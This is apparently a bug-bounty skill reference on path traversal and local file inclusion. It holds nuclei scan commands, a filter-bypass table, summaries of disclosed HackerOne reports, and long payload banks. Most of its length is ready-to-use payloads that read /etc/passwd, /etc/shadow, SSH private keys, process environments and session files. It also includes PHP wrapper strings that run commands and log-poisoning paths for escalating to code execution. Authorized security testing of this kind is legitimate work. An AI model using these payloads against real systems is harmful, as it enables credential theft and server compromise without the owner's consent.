Point the LFI fuzzers at file/download/export parameters.



```sh

nuclei -u https://target -tags lfi,traversal,path-traversal \

       -severity low,medium,high,critical -rl 40 -o nuclei_path-traversal.txt

nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/lfi -dast \

       -rl 40 -o nuclei_path-traversal_lfi.txt

nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/linux-lfi-fuzzing.yaml \

       -rl 40 -o nuclei_path-traversal_linux-lfi-fuzzing.txt

nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/windows-lfi-fuzzing.yaml \

       -rl 40 -o nuclei_path-traversal_windows-lfi-fuzzing.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Companion: hunting / references/techniques.md

# Path Traversal — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Find file/path params: file, path, template, lang, download, export, log, image.

- Try `../`, encoded variants, double encoding, unicode, backslashes, absolute paths.

- Bypass filters with nested sequences (`....//`), null bytes, and extension tricks.

- Test archive extraction (zip slip) and file-write paths.

- Look for LFI-to-RCE via log poisoning, sessions, and uploads.



## Bypass tricks



- Double encoding and mixed encodings (%252e, %c0%af, overlong UTF-8).

- Strip traversal once, then bypass with `....//` or `..%2f`.

- Absolute paths, UNC paths, and symlinks.



## Deeper checklist



- Find file/path parameters: file, path, template, lang, download, export, log.

- Try `../`, encoded variants, double encoding, unicode, backslashes, and absolute paths.

- Bypass filters with nested sequences (`....//`), null bytes, and extension tricks.

- Test archive extraction (zip slip) and file-write paths for traversal.

- Look for LFI-to-RCE via log poisoning, session files, and uploaded content.

- Read a harmless proof file (/etc/hostname, win.ini) and stop there.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **Arbitrary file read via the UploadsRewriter when moving and issue** — `#827052` · GitLab · $20,000 · ▲1503

  > The `UploadsRewriter` does not validate the file name, allowing arbitrary files to be copied via directory traversal when moving an issue to a new project.

- **[CVE-2022-44268] Arbitrary Remote Leak via ImageMagick** — `#1858574` · HackerOne · $0 · ▲371

  > Then, copy the `Raw profile type:` and decode it using any tool or using Python like;

- **Arbitrary file read  via the bulk imports UploadsPipeline** — `#1439593` · GitLab · $29,000 · ▲329

  > Save the following simple proxy server as `api.py` and run it with `FLASK APP=api flask run`, this will replace the `uploads.tar.gz` with a custom one: {F1565789}

- **Misuse of an authentication cookie combined with a path traversal on app.starbucks.com permitted access to restricted data** — `#876295` · Starbucks · $0 · ▲239

  > zlz and rhynorater discovered that by obtaining a valid authentication cookie and then combining that with a path traversal, this allowed access to restricted data.

- **Arbitrary file read during project import** — `#1132378` · GitLab · $16,000 · ▲194

  > I went through the charts in `https://gitlab.com/gitlab-org/charts/gitlab/-/tree/master/charts/gitlab/charts/sidekiq/templates`.

- **Burp Suite Professional: browser-powered crawl can write attacker-controlled files through file input handling** — `#3712279` · PortSwigger Web Security · $5,000 · ▲176

  > The issue is caused by Burp's handling of `<input type="file" `: Burp creates a local upload file from page-controlled attributes, but does not prevent path traversal in the generated filename.

- **Path traversal in filename in LINE Mac client** — `#727727` · LY Corporation · $0 · ▲175

  > The payload used for OS X Yosemite was: `..%2f..%2f..%2f..%2f..%2f..%2f..%2fApplications%2fCalculator.app .zip`, which would execute the calculator app.

- **Mozilla VPN Clients: RCE via file write and path traversal** — `#2995025` · Mozilla · $6,000 · ▲173

  > Vulnerable code (InspectorHotreloader::fetchAndAnnounce() https://github.com/mozilla-mobile/mozilla-vpn-client/blob/main/src/inspector/inspectorhotreloader.cpp):

- **RCE as Admin defeats WordPress hardening and file permissions** — `#436928` · WordPress · $0 · ▲164

  > and each part of it is appended to $target parent (../../../../../../../var/tmp/) and then chmod with the permission bit of 777.

- **[portswigger.net] Path Traversal al /cms/audioitems** — `#2424815` · PortSwigger Web Security · $0 · ▲146

  > `curl -kis "https://portswigger.net/cms/audioitems//etc/shadow"`

- **Payload delivery via Social Media urls on H1 profile** — `#2483422` · HackerOne · $0 · ▲138

  > HackerOne allows users to add social media profiles to their HackerOne profile via the [profile/edit](https://hackerone.com/settings/profile/edit) page.

- **Wordpress unzip_file path traversal** — `#205481` · WordPress · $0 · ▲119

  > Filenames can be crafted in order to place files in any directory which the webserver has write permissions, for example a zip entry with a filename of `../../../../../../../../../../tmp/poc file` would place the file contents in the '/tmp/poc file' directory.

- **Path Traversal Vulnerability in Lila Project** — `#3181066` · Lichess · $0 · ▲117

  > Privilege escalation (indirectly): By reading files related to user tokens or access control, an attacker might craft further exploits.

- **Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file read** — `#1415820` · Aiven Ltd · $1,000 · ▲105

  > 1.Run the following curl command to get the content of the /etc/passwd file on the server:

- **Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49** — `#1394916` · Internet Bug Bounty · $4,000 · ▲96

  > If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism.

- **Path traversal in Nuget Package Registry** — `#822262` · GitLab · $12,000 · ▲88

  > name the file above as `dummy.nuspec` and zip it into `dummy.nupkg` and upload it through `PUT /api/v4/projects/ {id}/packages/nuget/` endpoint will make GitLab to create a `nyangawa.nupkg` somewhere in the filesystem.

- **Korea - LFI via path traversal at https://msr.istarbucks.co.kr:6443/appif/** — `#780021` · Starbucks · $0 · ▲81

  > While analyzing the Starbucks Korea mobile application, i noticed that it called an API at https://msr.istarbucks.co.kr:6443/appif/.

- **File writing by Directory traversal at actionpack-page_caching and RCE by it** — `#519220` · Ruby on Rails · $1,000 · ▲80

  > Since the URL can use `.` or` / `encoded values, the cache will be written in an unexpected place.

- **Grafana LFI on https://grafana.mariadb.org** — `#1419213` · MariaDB · $0 · ▲73

  > There is an LFI on `https://grafana.mariadb.org/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd`

- **CVE-█████-35813 in █████** — `#2200329` · Mars · $0 · ▲71

  > The vulnerability was exploited through the sitecore xaml.ashx endpoint using ASP.NET TemplateParser injection, allowing attackers to execute arbitrary code by manipulating the ParseControl function with malicious XAML markup.

- **CVE-2020-3187 - Unauthenticated Arbitrary File Deletion** — `#960330` · U.S. Dept Of Defense · $0 · ▲70

  > Vector: [CVSS:3.0/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X](https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

- **Unauthenticated LFI (Local File Inclusion) using the symbol `!` At the target `https://████/`** — `#2778380` · U.S. Dept Of Defense · $0 · ▲69

  > Sanitize user input and don't trust user inputs that come for your server in a `GET` method after the endpoint `/compilerDirectivesAdd/{Attackers Coming From Here To Read Local Files}`, it would be better to maintain a whitelist of acceptable filenames and…

- **jitsi-call-analytics: Unauthenticated arbitrary file write via path traversal in `/api/v1/uploads/analyze`** — `#3485343` · 8x8 · $100 · ▲68

  > The upload handler used user-controlled `file.originalname` directly in `path.join()` without sanitization, enabling attackers to include `../` sequences to escape the intended per-session UUID directory and write or overwrite files anywhere under the…

- **Path traversal by monkey-patching Buffer internals** — `#2434811` · Internet Bug Bounty · $2,430 · ▲67

  > However, after the permission model implementation has called `path.resolve()`, the exploit intercepts the internal call to `utf8Write()` within `Buffer.from()` and replaces the sanitized path with `/tmp/../etc/passwd`, thus bypassing the path traversal…

- **Path traversal in deeplink query parameter can expose any user's private info to a public directory (one click)** — `#2553411` · Basecamp · $0 · ▲65

  > <a href="https://3.basecamp.com/5195267/reports/progress?filename=/../../../../../../../../../../sdcard/Download/disclosure.txt" click me</a

- **Path Traversal Vulnerability in Nextcloud Tables Enables Arbitrary File Exfiltration of Any Files Supported by PhpSpreadsheet Library** — `#3249624` · Nextcloud · $0 · ▲63

  > Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-wpp5-4w35-pxq6

- **CVE-2018-0296 Cisco ASA Denial of Service & Path Traversal vulnerable on [mtn.co.ug]** — `#2375666` · MTN Group · $0 · ▲62

  > Navigate intercept request to burp-suite `h27da.n1.ips.mtn.co.ug/+CSCOU+/../+CSCOE+/files/file list.json`

- **MozillaVPN: Elevation of Privilege via a Logic Vulnerability** — `#2686750` · Mozilla · $0 · ▲60

  > This vulnerability is a bypass for a previously fixed issue 2261577.

- **Path traversal by drive name in Windows environment** — `#2307225` · Node.js · $0 · ▲59

  > This vulnerability affects Windows users of `path.join` API.

- **ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection** — `#3580511` · Ruby on Rails · $0 · ▲57

  > When a Hash is passed to `.attach()`, every key-value pair — including `key:` — is forwarded to `Blob.build after unfurling` via ` ` splat.



## Case studies



### Arbitrary file read via the UploadsRewriter when moving and issue

`#827052` · GitLab · $20,000 · critical · 2020-04-27 · ▲1503

> The UploadsRewriter does not validate the file name, allowing arbitrary files to be copied via directory traversal when moving an issue to a new project. The pattern used to look for references is : This is used by the UploadsRewriter when copying an issue to also copy across the files: As there is no restriction on what file can be, path traversal can be used to copy any file. Demo {F757226}



### [CVE-2022-44268] Arbitrary Remote Leak via ImageMagick

`#1858574` · HackerOne · $0 · critical · 2023-03-16 · ▲371

> Summary: HackerOne's image upload is using ImageMagick to convert/resize images and is likely updated. Thus, it's vulnerable to CVE-2022-44268. Description: Steps To Reproduce 1. Navigate to your profile 2. Edit and upload the attached image (im-lfi.png) as your profile picture 3. Save changes and download the resized picture 4.



### Arbitrary file read  via the bulk imports UploadsPipeline

`#1439593` · GitLab · $29,000 · critical · 2022-03-21 · ▲329

> The bulk imports api does not remove symlinks when untaring the uploads.tar.gz file, allowing arbitrary files to be read and uploaded when importing a group. When a group has uploads (such as markdown attachments), an uploads.tar.gz file will be downloaded and extracted in the UploadsPipeline: https://gitlab.com/gitlab-org/gitlab/-/blob/v14.6.0-ee/lib/bulk imports/common/pipelines/uploads pipeline.rb L15 Since untar zxf only changes the permissions, any…



### Misuse of an authentication cookie combined with a path traversal on app.starbucks.com permitted access to restricted data

`#876295` · Starbucks · $0 · critical · 2020-06-16 · ▲239

> zlz and rhynorater discovered that by obtaining a valid authentication cookie and then combining that with a path traversal, this allowed access to restricted data. noapearson assisted by providing additional information post discovery. @zlz / @rhynorater / @noapearson — thank you for reporting this vulnerability and for confirming the resolution.



### Arbitrary file read during project import

`#1132378` · GitLab · $16,000 · critical · 2021-05-24 · ▲194

> A mis-usage of json schema validator could be used by an attacker to read any file in GitLab server. The issue allows the attacker to leak ~250 bytes of data of any file. At the same time, as the root cause of the issue here is 'open-uri'. It's an SSRF issue at the same time.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class path-traversal --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class path-traversal

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class path-traversal

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class path-traversal --min-bounty 1000

```



## Named CVEs / Public Techniques (grounding)



Verified, correctly-attributed references for the patterns above:

- **PHP filter-chain to RCE** — Synacktiv research (2022); `php_filter_chain_generator`. Not a CVE; an abuse of documented `iconv` behaviour. The reason a bare file-read upgrades to Critical.

- **CVE-2021-41773** — Apache HTTP Server 2.4.49 path traversal (`%2e` in normalized path) → file read, and RCE when `mod_cgi` is enabled.

- **CVE-2021-42013** — Apache HTTP Server 2.4.50 incomplete fix for the above (double-encoded `%%32%65`) → traversal/RCE.

- **CVE-2024-4577** — PHP-CGI argument injection on Windows (Best-Fit encoding); reachable on XAMPP-style stacks, chains from file-serve to RCE.



> Grounding note: this skill is built from 31 disclosed LFI/path-traversal reports. When citing a specific HackerOne report in your write-up, link the exact report URL/ID you used — do **not** paraphrase a report ID from memory. A wrong ID is worse than none.



---



## Bypass Table



| Filter | Bypass |

|--------|--------|

| Strips `../` once | `....//` or `..../\` (re-forms `../` after strip) |

| URL-decodes once | `%252f` (double-encode `/`), `%252e` for dots |

| Decodes once, blocks `..` | Encode dots: `%2e%2e%2f` / overlong `%c0%ae` (legacy) |

| Appends `.php` to input | `?` or `#` truncation; null byte `%00` (PHP < 5.3.4) |

| Blocks `php://` scheme | try `PHP://`, `pHp://`, or `data://` / `expect://` |

| Prepends fixed base dir | enough `../` to escape; or absolute path if no base prepend |

| Blocks `/etc/passwd` literal | path-truncation, `/etc/./passwd`, `/etc//passwd` |

| WAF on long filter-chains | move chain to POST body / minimize payload |

| Windows | `..\..\..\windows\win.ini`, `..%5c..%5c` |



---

## Corpus payload bank (curated)

### Basic traversal

```text
../../../../etc/passwd
../../../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../proc/self/environ
../../../../proc/self/cmdline
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
../../../../home/user/.ssh/id_rsa
..\..\..\..\windows\win.ini
..\..\..\..\boot.ini
..\..\..\..\windows\system32\drivers\etc\hosts
```

### Encoded traversal

```text
..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%5c..%5c..%5c..%5cwindows/win.ini
%252e%252e%252f%252e%252e%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
..%e0%80%af..%e0%80%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
..%2F..%2F..%2Fetc%2Fpasswd%00.png
```

### Filter bypass

```text
....//....//....//etc/passwd
....\....\....\windows\win.ini
..././..././..././etc/passwd
..;/..;/..;/etc/passwd
..%00/..%00/..%00/etc/passwd
/etc/passwd%00.png
/etc/passwd%00.jpg
....//....//....//....//etc/passwd
..%2f..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc%252fpasswd
..//..//..//etc/passwd
..%5c..%5c..%5cwindows%5cwin.ini
```

### Wrappers & absolute paths

```text
file:///etc/passwd
file:///c:/windows/win.ini
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../../etc/passwd
php://filter/convert.base64-encode/resource=../config.php
phar://upload.phar/index.php
zip://upload.zip%23shell.php
data://text/plain,<?php system('id'); ?>
/etc/passwd
/proc/self/environ
C:\windows\win.ini
\\127.0.0.1\c$\windows\win.ini
```

### LFI to RCE

```text
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/tmp/sess_<PHPSESSID>
/var/lib/php/sessions/sess_<PHPSESSID>
/var/log/auth.log
/var/log/mail.log
..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log
..%2f..%2f..%2f..%2fproc%2fself%2fenviron
..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f0
```

## Corpus wordlists (mined)

### `params_path-traversal.txt`

```text
type
textdomain
lang
YEAR
path
DIR
name
SIZE
STYLE
TYPE
ACTIVES
AGE
DISPLAY
PHOT
SUB_PROD
NAV
YR
ARCHIVE
MO
PROD
BASIN
AREA
STORM_NAME
CURRENT
PRODUCT
SUB_SUB_PROD
app
platform
resource-type
USE_THIS_DIR
rest_route
filePathDownload
AID_DIR
filename
version
vector
action
uid
id
ifn
ifl
diff
tab
editorImpl
FORCE_STATIC
TO
format
patternType
case
_ajax_nonce
postid
do
target
force
directory
external
dir
poc_cmd
shop
Shop
docID
post
_wpnonce
registerUserInfoCommand.organizationId
registerUserInfoCommand.currPageName
registerUserInfoCommand.nextPageName
registerUserInfoCommand.prevPageName
registerUserInfoCommand.submitButton
p.hits
p.limit
op
image_id
image_temp
ANIM_TYPE
INFO
fcadbadd
perpkg
next
date
```

### `paths_path-traversal.txt`

```text
/+CSCOT+/translation-table
/sessions
/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86
/+CSCOT+/oem-customization
/+CSCOE+/session_password.html
/cgi-bin/cvename.cgi
/session_password.html
/download.php
/+CSCOE+/portal_inc.lua
/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-path-JE3azWw43
/index.html
/.ssh/authorized_keys
/security/center/cvssCalculator.x
/translation-table
/WEB-INF/web.xml
/.bashrc
/package/localhost-now
/chapter-1/threat-UIR.html
/Desktop
/graph.php
/uploads
/api/v4/projects/
/exploit/etc/passwd
/vuln/detail/CVE-2018-0296
/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd
/search
/wp/v2/media
/finalize
/dana/html5acc/guacamole/
/package/simplehttpserver
/.bash_profile
/████/login/downloadForm
/metrics
/html/js/editor/editor.jsp
/package/serve
/package/angular-http-server
/package/statics-server
/libraries/image-editor/image-edit.php
/package/mcstatic
/+CSCOE+/logon.html
/research/zip-slip-vulnerability
/package/http-live-simulator
/package/public
/package/http_server
/%2bCSCOE%2b/portal_inc.lua
/uploads/(
/groups/group_to_import_1/-/uploads/d3209c811fee407218bff7cb3b4333e6/secrets.yml
/srv/gitlab/config/secrets.yml
/groups/group_to_import_1/-/milestones/1
/groups/group_to_import_1/-/uploads/d3209c811fee407218bff7cb3b4333e6/passwd
/-/profile/personal_access_tokens
/api/v4/projects/PROJECT_ID/import
/api/v4/internal/personal_access_token
/poc_file_input_write_startup_calc.html
/upload
/Downloads
/Hardening_WordPress
/Function_Reference/unzip_file
/wp-admin/includes/file.php
/packaging/2013/05/nuspec.xsd
/packages/nuget/
/appif/
/index
/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/
/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/crontab
/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
/compilerDirectivesAdd/
/api/v1/uploads/analyze
/exploit/
/sdcard/Download/disclosure.txt
/rest/tinymce/1/macro/preview
/active_storage_overview.html
/assets
/api/v1/documents
/rails/storage/
/wp/v2
/wp/v2/media/(
/wp/v2/media/8&force=true
/db/vulnerabilities/wordpress-cve-2018-12895/
/sideload
/wp/v2/media/
/wp/v2/media/8/finalize
/edit
/localhost:8356
/post-process
/blog/wordpress-file-delete-to-code-execution/
/vulnerability/42ab2bd9-bbb1-4f25-a632-1811c5130bb4/
/wp-content
/custom-sounds/
/runner/project/13083/ruby-235-with-yarn[0;m
/builds/jobertabma/build-test
/runner/project/5024150/cache
/runner/gitlab/project/1/cache
/post/cloudflare-pages-privesc-and-page-tampering/
/post/hacking-cloudflare-pages-part-2/
/index.php/apps/extract/ajax/extractHere.php
/apps/files/
/&poc_cmd=whoami
/test
/xxx/yyy/zzz/
/cdn-cgi/beacon/expect-ct
/predict/report_weakness_id
/app
/images/variant
/data/data/com.evernote/lib-1/libjnigraphics.so
/data/data/com.evernote/cache/preview/:UUID/
/proxy/test
/proxy
/apps/ss/test
/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
/apiv2/user/upload
/profile
/users/
/safe/output/directory
/intended/output/dir/etc/passwd
/safe/output/directory/pwned_file
/file
/intended/output/dir
/login
/run-your-own-gem-server/
/ab_
/link
/1.png,,http:/
/wrong_url.html
/Delete
/shared/%252e%252e%252fsecret.txt
/shared
/secret.txt
/curl-test/testdir/outside.txt
/curl-test/dir/inside.txt
/dir
/curl-test/dir
/curl-test/testdir
/curl-test
/eam/vib
/woocommerce/includes/abstracts/abstract-wc-product.php
/package/bower
/package/tar-fs
/test.txt
/Nextcloud/.bash_profile
/nextcloud/remote.php/dav/files/admin/
/ns
/Nextcloud/
/gwtmain/
/admin/file/upload
/package/express-cart
/package/html-pages
/data/user/0/com.nextcloud.client/
/data/data/
```

### `payloads_path-traversal.txt`

```text
../../../../etc/passwd
../../../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../proc/self/environ
../../../../proc/self/cmdline
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
../../../../home/user/.ssh/id_rsa
..\..\..\..\windows\win.ini
..\..\..\..\boot.ini
..\..\..\..\windows\system32\drivers\etc\hosts
..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%5c..%5c..%5c..%5cwindows/win.ini
%252e%252e%252f%252e%252e%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
..%e0%80%af..%e0%80%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
..%2F..%2F..%2Fetc%2Fpasswd%00.png
....//....//....//etc/passwd
....\....\....\windows\win.ini
..././..././..././etc/passwd
..;/..;/..;/etc/passwd
..%00/..%00/..%00/etc/passwd
/etc/passwd%00.png
/etc/passwd%00.jpg
....//....//....//....//etc/passwd
..%2f..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc%252fpasswd
..//..//..//etc/passwd
..%5c..%5c..%5cwindows%5cwin.ini
file:///etc/passwd
file:///c:/windows/win.ini
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../../etc/passwd
php://filter/convert.base64-encode/resource=../config.php
phar://upload.phar/index.php
zip://upload.zip%23shell.php
data://text/plain,<?php system('id'); ?>
/etc/passwd
/proc/self/environ
C:\windows\win.ini
\\127.0.0.1\c$\windows\win.ini
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/tmp/sess_<PHPSESSID>
/var/lib/php/sessions/sess_<PHPSESSID>
/var/log/auth.log
/var/log/mail.log
..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log
..%2f..%2f..%2f..%2fproc%2fself%2fenviron
..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f0
```

### `payloads_path-traversal_waf.txt`

```text
....//....//....//etc/passwd
....\....\....\windows\win.ini
..././..././..././etc/passwd
..;/..;/..;/etc/passwd
..%00/..%00/..%00/etc/passwd
/etc/passwd%00.png
/etc/passwd%00.jpg
....//....//....//....//etc/passwd
..%2f..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc%252fpasswd
..//..//..//etc/passwd
..%5c..%5c..%5cwindows%5cwin.ini
```

## Source skills merged into this topic

- `h1skills` — `hackerone-path-traversal`
- `hunting` — `path-traversal`
- `cbh` — `hunt-lfi`

## Provenance

- `references/unified-method.md` — same deduplicated union as this file, for tooling
- `references/upstream-*.md` — unmodified original SKILL.md from each repo
- `references/upstream-assets/` — 2 companion files
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
